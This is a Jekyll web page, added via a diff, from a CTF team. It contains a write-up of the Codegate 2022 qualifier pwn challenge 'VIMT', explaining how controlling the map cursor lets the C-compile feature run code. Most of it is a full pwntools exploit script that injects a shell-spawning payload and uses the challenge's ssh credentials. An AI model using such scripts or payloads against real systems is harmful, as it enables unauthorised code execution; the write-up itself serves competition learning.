@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>VIMT | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="VIMT" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/Codegate-2022-quals/pwn/vimt.html" />
+<meta property="og:url" content="https://org.anize.rs/Codegate-2022-quals/pwn/vimt.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="VIMT" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"VIMT","url":"https://org.anize.rs/Codegate-2022-quals/pwn/vimt.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="vimt">VIMT</h1>
+
+<p><strong>Author</strong>: <a href="https://twitter.com/galli_leo_">gallileo</a></p>
+
+<p><strong>Tags:</strong> pwn</p>
+
+<p><strong>Points:</strong> 856 (21 solves)</p>
+
+<p><strong>Description:</strong></p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">ssh ctf@3.38.59.103 -p 1234 password: ctf1234_smiley</code></p>
+
+  <p>Monkeys help you</p>
+</blockquote>
+
+<p>Although a somewhat unconventional setup (ssh’ing into the binary<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>), the binary itself is fairly simple and even comes with symbols. The basic functionality is as follows:</p>
+
+<p>The binary creates a 2D map the size of your terminal. In a loop, it waits for you to enter a character. The character gets placed at the current position in the map, followed by 5 random characters. In addition, by sending a <code class="language-plaintext highlighter-rouge">\x1b</code> character, a command could be executed. The interesting commands are:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">compile</code>: Compiles the current map as C code and executes the result.</li>
+  <li><code class="language-plaintext highlighter-rouge">set</code>: Set the y coordinate of the current map position.</li>
+</ul>
+
+<p>We also notice some interesting setup code in <code class="language-plaintext highlighter-rouge">init</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v4</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
+<span class="n">v3</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+<span class="n">v0</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+<span class="n">v1</span> <span class="o">=</span> <span class="n">mix</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span> <span class="c1">// some z3 looking combination of inputs.</span>
+<span class="n">srand</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>To me it looked like the intentional solution might have been to reverse the mix function and figure out the random seed to predict which additional letters get added to the map. However, we can actually solve this without having to do that.
+I noticed, that by having a prime terminal width, we could actually also set the x coordinate. If we can set the x coordinate, we can of course create arbitrary map contents.</p>
+
+<p>If our terminal has a width of 29 and every time we enter a character the x position moves by 6, we can do the following:</p>
+
+<ol>
+  <li>Enter 5 characters, now x position moves by 30 (with wrap around)</li>
+  <li>This means x position is now actually one after the original x position</li>
+</ol>
+
+<p>Since we can reset the y position to the original value, we can hence control the x position and can write anything on the map. Since doing this on the server was very slow (for some reason) and I probably made a mistake with my python code (more than one line would break it), we wanted a payload that is shorter than 29 characters. Luckily the following worked <code class="language-plaintext highlighter-rouge">main(){system("sh");}//</code>.</p>
+
+<p>Now the only thing left was fighting with pwntools, ssh and pseudoterminals (aka try random options until you get it to work) to actually have the correctly sized terminal on the remote. After that, it was just waiting around 20 minutes and then we got a shell. For some reason, I did not see any stdout of the remote terminal (except newlines maybe), so I had to exfil the flag with some bash magic.</p>
+
+<p>The final exploit script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template app
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'app'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">,</span> <span class="n">raw</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">remote</span><span class="p">():</span>
+    <span class="c1">#return ssh("ctf", host="3.38.59.103", port=1234, password="ctf1234_smiley")
+</span>    <span class="c1"># stty cols 29 rows 12
+</span>    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"sshpass -e ssh -tt ctf@3.38.59.103 -p 1234 'bash -i'"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"SSHPASS"</span><span class="p">:</span> <span class="s">"ctf1234_smiley"</span><span class="p">})</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"~$ "</span><span class="p">,</span> <span class="s">"stty cols 29 rows 12"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"~$ "</span><span class="p">,</span> <span class="s">"./app"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+tbreak main
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
+</span>
+<span class="c1">#### remote comms
+</span><span class="n">WIDTH</span> <span class="o">=</span> <span class="mi">29</span>
+<span class="n">HEIGHT</span> <span class="o">=</span> <span class="mi">10</span>
+
+<span class="k">def</span> <span class="nf">read_mappa</span><span class="p">():</span>
+    <span class="n">begin</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="o">*</span><span class="n">WIDTH</span><span class="p">)</span>
+    <span class="n">read_map</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="o">*</span><span class="n">WIDTH</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"REMOTE MAP:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">read_map</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">"ignore"</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">begin</span> <span class="o">+</span> <span class="n">read_map</span>
+
+<span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">read_mappa</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">read</span> <span class="o">=</span> <span class="bp">True</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x1b</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">read</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">read_mappa</span><span class="p">()</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">do_compile</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">send_command</span><span class="p">(</span><span class="s">"compile"</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">do_set_y</span><span class="p">(</span><span class="n">y_val</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">send_command</span><span class="p">(</span><span class="sa">f</span><span class="s">"set y </span><span class="si">{</span><span class="n">y_val</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">RAND_CHARS</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!"</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Using terminal of size %d x %d"</span><span class="p">,</span> <span class="n">WIDTH</span><span class="p">,</span> <span class="n">HEIGHT</span><span class="p">)</span>
+
+<span class="n">mappa</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HEIGHT</span><span class="p">):</span>
+    <span class="n">row</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">WIDTH</span><span class="p">):</span>
+        <span class="n">row</span> <span class="o">+=</span> <span class="s">" "</span>
+    <span class="n">mappa</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+
+<span class="n">cur_x</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">cur_y</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">check_coords_up</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">cur_x</span><span class="p">,</span> <span class="n">cur_y</span>
+    <span class="k">if</span> <span class="n">cur_x</span> <span class="o">&gt;=</span> <span class="n">WIDTH</span><span class="p">:</span>
+        <span class="n">cur_x</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">cur_y</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="n">cur_y</span> <span class="o">&gt;=</span> <span class="n">HEIGHT</span><span class="p">:</span>
+        <span class="n">cur_y</span> <span class="o">=</span> <span class="n">HEIGHT</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">set_car</span><span class="p">(</span><span class="n">car</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">mappa</span><span class="p">,</span> <span class="n">cur_y</span><span class="p">,</span> <span class="n">cur_x</span>
+    <span class="n">row</span> <span class="o">=</span> <span class="n">mappa</span><span class="p">[</span><span class="n">cur_y</span><span class="p">]</span>
+    <span class="n">mappa</span><span class="p">[</span><span class="n">cur_y</span><span class="p">]</span> <span class="o">=</span> <span class="n">row</span><span class="p">[:</span><span class="n">cur_x</span><span class="p">]</span> <span class="o">+</span> <span class="n">car</span> <span class="o">+</span> <span class="n">row</span><span class="p">[</span><span class="n">cur_x</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
+
+<span class="k">def</span> <span class="nf">inpKey</span><span class="p">(</span><span class="n">car</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">cur_x</span>
+    <span class="n">rem_map</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">car</span><span class="p">)</span>
+    <span class="n">check_coords_up</span><span class="p">()</span>
+    <span class="n">set_car</span><span class="p">(</span><span class="n">car</span><span class="p">)</span>
+    <span class="n">cur_x</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">check_coords_up</span><span class="p">()</span>
+        <span class="n">rand_car</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">RAND_CHARS</span><span class="p">)</span>
+        <span class="n">set_car</span><span class="p">(</span><span class="n">rand_car</span><span class="p">)</span>
+        <span class="n">cur_x</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">rem_map</span>
+
+<span class="k">def</span> <span class="nf">set_y</span><span class="p">(</span><span class="n">y_val</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">cur_y</span>
+    <span class="n">do_set_y</span><span class="p">(</span><span class="n">y_val</span><span class="p">)</span>
+    <span class="n">cur_y</span> <span class="o">=</span> <span class="n">y_val</span>
+
+<span class="k">def</span> <span class="nf">set_x</span><span class="p">(</span><span class="n">x_val</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">cur_y</span><span class="p">,</span> <span class="n">cur_x</span>
+    <span class="k">if</span> <span class="n">cur_x</span> <span class="o">==</span> <span class="n">x_val</span><span class="p">:</span>
+        <span class="k">return</span>
+    <span class="c1"># this is more involved!
+</span>
+    <span class="c1"># number of times to enter a character for a row to be filled.
+</span>    <span class="c1"># every time we enter a character, we write 6 to the map!
+</span>    <span class="n">min_to_fill</span> <span class="o">=</span> <span class="p">(</span><span class="n">WIDTH</span> <span class="o">//</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="c1"># number of characters the new x position on the next row will be offset
+</span>    <span class="n">offset</span> <span class="o">=</span> <span class="n">min_to_fill</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">-</span> <span class="n">WIDTH</span>
+    <span class="c1"># we could actually use any offset, would just mean more math lol
+</span>    <span class="k">assert</span> <span class="n">offset</span> <span class="o">==</span> <span class="mi">1</span>
+    <span class="c1"># number of characters difference between desired and required x val
+</span>    <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="n">x_val</span> <span class="o">-</span> <span class="n">cur_x</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">diff</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">diff</span> <span class="o">+=</span> <span class="n">WIDTH</span>
+    <span class="n">num_inputs</span> <span class="o">=</span> <span class="p">(</span><span class="n">diff</span> <span class="o">//</span> <span class="n">offset</span><span class="p">)</span> <span class="o">*</span> <span class="n">min_to_fill</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Additional inputs: %d"</span><span class="p">,</span> <span class="n">num_inputs</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_inputs</span><span class="p">):</span>
+        <span class="n">inpKey</span><span class="p">(</span><span class="s">"G"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"cur_x %d vs x_val %d"</span><span class="p">,</span> <span class="n">cur_x</span><span class="p">,</span> <span class="n">x_val</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="n">cur_x</span> <span class="o">==</span> <span class="n">x_val</span>
+
+
+<span class="k">def</span> <span class="nf">pmap</span><span class="p">():</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"MAP:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">mappa</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">write_line</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Writing line %s @ y = %d"</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">car</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+        <span class="n">set_x</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+        <span class="n">set_y</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="n">inpKey</span><span class="p">(</span><span class="n">car</span><span class="p">)</span>
+    <span class="n">set_x</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+    <span class="n">set_y</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+    <span class="n">inpKey</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_str</span><span class="p">(</span><span class="n">start_x</span><span class="p">,</span> <span class="n">start_y</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">start_x</span>
+    <span class="n">y</span> <span class="o">=</span> <span class="n">start_y</span>
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">car</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+        
+        <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="n">WIDTH</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">y</span> <span class="o">=+</span> <span class="mi">1</span>
+        <span class="k">if</span> <span class="n">y</span> <span class="o">&gt;=</span> <span class="n">HEIGHT</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="s">"FAILED TO WRITE STRING!"</span><span class="p">)</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Writing %s at %d, %d"</span><span class="p">,</span> <span class="n">car</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+        <span class="n">set_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">set_y</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="n">rem_map</span> <span class="o">=</span> <span class="n">inpKey</span><span class="p">(</span><span class="n">car</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">idx</span> <span class="o">%</span> <span class="mi">10</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"remote map:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">rem_map</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">"ignore"</span><span class="p">))</span>
+        <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Initial map:"</span><span class="p">)</span>
+<span class="n">pmap</span><span class="p">()</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="c1"># io.interactive()
+</span><span class="n">init_map</span> <span class="o">=</span> <span class="n">read_mappa</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"init remote map:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">init_map</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">"ignore"</span><span class="p">))</span>
+
+<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="s">"""main(){system("sh");}//"""</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PAYLOAD:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">)</span>
+
+<span class="n">write_str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"map with payload:"</span><span class="p">)</span>
+<span class="n">pmap</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Writing map to file: test.c"</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"test.c"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">mappa</span><span class="p">))</span>
+
+<span class="n">rem_map</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="s">"$"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Remote map:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">rem_map</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">"ignore"</span><span class="p">))</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">do_compile</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>The setup actually allowed you to get a terminal on the server. However, since the flag is only readable by root and the challenge binary is setuid, we still need to pwn the binary. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
